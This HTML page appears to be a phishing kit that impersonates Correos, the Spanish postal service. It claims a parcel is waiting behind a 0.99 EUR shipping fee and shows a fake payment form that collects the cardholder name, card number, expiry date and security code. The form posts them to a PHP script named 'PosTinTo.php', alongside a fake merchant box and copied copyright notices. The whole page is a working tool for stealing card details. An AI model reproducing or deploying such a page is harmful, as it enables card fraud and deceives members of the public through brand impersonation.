<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="corrios/img/correos.ico">
<link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="./corrios/css/corrios_style01.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

</head>
<body>

<div class="topnav" id="myTopnav">
  <a href="" ><img src="./corrios/img/Logo_Correos.png" id="img"></a>
  <a id="right">Welcome</a>
  <a id="right">Ongi etorri</a>
  <a id="right">Benvinguts</a>
  <a id="right">Benvidos</a>
  <a id="right" class="rightBorder">Bienvenidos</a>
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>



<main role="main" class="flex-shrink-0">






    

<div class="jumbotron" id="bgindex">
        <div class="container">
          <h1 class="display-3"><img src="./corrios/img/Correos_2020.png"  width="200"></h1>
         <span class="itext-center"><span class="nota">NOTA : </span>Debe ingresar sus datos y pagar 0,99 EUR para recibir su paquete con correos.</span>
         
        </div>
      </div>
  <div class="container">

<div class="row">

            <div class="col-sm-9">
               <p class="alert alert-success" id="alert-success"><i class="fab fa-cc-mastercard"></i> &nbsp;<i class="fab fa-cc-visa"></i> &nbsp; Confirme los gastos de envío (0,99 EUR) y la dirección de entrega del paquete.</p>
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
<div class="card-body " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <div class="form-group">
    <label for="username">Nombre completo (en la tarjeta)</label>
    <input type="text" class="form-control" name="Kartenhalter" placeholder="" id="Kartenhalter">
  </div> <!-- form-group.// -->

  <div class="form-group">
    <label for="cardNumber">Número de tarjeta</label>
    <div class="input-group">
      <input type="text" class="form-control" name="Kartennummer" id="Kartennummer" placeholder="">
      <div class="input-group-append">
        <span class="input-group-text text-muted">
          <i class="fab fa-cc-visa"></i> &nbsp; <i class="fab fa-cc-amex"></i> &nbsp; 
          <i class="fab fa-cc-mastercard"></i> 
        </span>
      </div>
    </div>
  </div> <!-- form-group.// -->

  <div class="row">
      <div class="col-sm-8">
          <div class="form-group">
              <label><span class="hidden-xs">Fecha de caducidad</span> </label>
            <div class="input-group">
              <input type="text" class="form-control" placeholder="" name="Ablauf" id="Ablauf">
            </div>
          </div>
      </div>
      <div class="col-sm-4">
          <div class="form-group">
              <label data-toggle="tooltip" title="" data-original-title="3 digits code on back side of the card">Cód. Seguridad <i class="fa fa-question-circle"></i></label>
              <input type="text" class="form-control" name="Sicherheitscode" id="Sicherheitscode">
          </div> <!-- form-group.// -->
      </div>
  </div> <!-- row.// -->
  <button class="subscribe btn btn-primary btn-block" type="submit" name="cartget"> Pagar  </button>
  
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div></form>
            </div>

            <div class="col-sm-3 ">
               
               <div class="card" >
  <div class="card-header">
   <strong>  Datos de la operación</strong>
  </div>
  <ul class="list-group list-group-flush">
    <li class="list-group-item"><strong> Importe: </strong>0,99 €</li>
    <li class="list-group-item"><strong> Comercio: </strong>SOCIEDAD ESTATAL (CORREOS)</li>
    <li class="list-group-item"><strong> Terminal: </strong>346841091-1</li>
    <li class="list-group-item"><strong> Pedido: </strong>111962998804</li>
    <li class="list-group-item"><img src="./corrios/img/ServiRed1.gif"></li>
  </ul>

  
</div>

        </div>



</div>

  </div>





<!-- Footer -->
<!-- Footer -->
<footer class="page-footer font-small blue pt-4">

  <!-- Footer Links -->
  <div class="container-fluid text-center text-md-left">

    <!-- Grid row -->
    <div class="row">

      <!-- Grid column -->
      <div class="col-md-6 mt-md-0 mt-3">

        <!-- Content -->
        <h5 class="text-uppercase"><img src="corrios/img/correosimg.png"></h5>
        <p class="pfooter">©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.</p>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none pb-3">

      <!-- Grid column -->
      <div class="col-md-3 mb-md-0 mb-3">

        <!-- Links -->

        <ul class="list-unstyled">
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Aviso legal</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Privacidad web</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Mapa web</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Accesibilidad</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <!-- Grid column -->
      <div class="col-md-3 mb-md-0 mb-3">

        <!-- Links -->

        <ul class="list-unstyled">
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Política de Cookies</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Alerta de seguridad</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;RSS</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Productos de la A a la Z</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

    </div>
    <!-- Grid row -->

  </div>
  <!-- Footer Links -->

  <!-- Copyright -->
  <div class="footer-copyright text-center py-3 pfooter">© 2022 Copyrigh :
    <a href="" class="atext"> correos.es</a>
  </div>
  <!-- Copyright -->

</footer>
<!-- Footer -->
<!-- Footer -->



</main>





<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
</script>
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Kartennummer").inputmask({"mask": "9999 9999 9999 9999"});
            $("#Ablauf").inputmask({"mask": "99/9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>
<script  src="sourceApp/chronopost_cc.js"></script>



</body>
</html>
